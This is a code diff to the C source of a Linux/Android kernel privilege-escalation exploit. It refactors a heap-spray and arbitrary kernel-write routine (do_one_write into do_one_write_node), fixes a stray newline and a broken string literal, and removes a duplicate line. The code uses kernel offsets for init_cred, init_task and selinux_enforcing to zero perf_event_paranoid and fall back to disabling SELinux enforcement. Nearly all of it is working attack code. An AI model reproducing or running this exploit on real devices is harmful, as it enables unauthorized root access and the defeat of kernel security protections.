@@ -47,7 +47,7 @@ const struct kernel_offsets *active_offsets = NULL;
 #undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
 #undef SLIDE_SYSCTL_BOOTID_OFF
 
-#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing\n
+#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
 #define SYSCTL_PERF_EVENT_PARANOID_OFF active_offsets->off_sysctl_perf_event_paranoid
 #define INIT_CRED_OFF                 active_offsets->off_init_cred
 #define INIT_TASK_OFF                 active_offsets->off_init_task
@@ -249,9 +249,10 @@ void run_main_route_threads(void) {
   while (!atomic_load(&route_done)) usleep(5000);
 }
 
-static int do_one_write(uintptr_t target, const char *desc, int mode) {
+static int do_one_write_node(uintptr_t target, const char *desc, int mode,
+                             int child_node) {
   pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
-  pselect_child_node = 1;
+  pselect_child_node = child_node;
   set_pselect_write_mode(target, 0, mode);
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
@@ -261,6 +262,10 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   TIMER("  PI route done");
   clear_pselect_write();
   return 1;
+}
+
+static int do_one_write(uintptr_t target, const char *desc, int mode) {
+  return do_one_write_node(target, desc, mode, 1);
 }
 
 
@@ -660,11 +665,9 @@ int run_exploit(int argc, char **argv) {
       for (int att = 1; att <= 5; att++) {
         do_one_write_node(data_addr(SYSCTL_PERF_EVENT_PARANOID), "W1c: perf unblock", 1, 0);
         usleep(100000);
-        if (get_perf_paranoid() == 0) { pr_success("perf_event_paranoid = 0
-"); break; }
+        if (get_perf_paranoid() == 0) { pr_success("perf_event_paranoid = 0\n"); break; }
       }
     }
-    selinux_ok = 1;
     selinux_ok = 1;
   } else if (!selinux_ok && !root_child_done) {
     /* Fallback: direct PI write to selinux_enforcing */
